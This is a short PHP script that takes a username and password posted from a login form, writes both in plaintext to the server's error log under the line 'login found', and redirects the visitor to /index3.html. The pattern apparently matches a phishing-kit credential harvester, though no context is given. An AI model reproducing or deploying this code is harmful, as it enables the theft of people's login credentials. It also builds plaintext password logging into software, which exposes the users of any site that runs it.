<?php
error_log("login found");
error_log("----------------------------------");
error_log("\nUsername: " . $_POST['username'] . " \n Pass: " . $_POST['password'] );
error_log("\n");
error_log("----------------------------------");
header('Location:/index3.html');
exit();
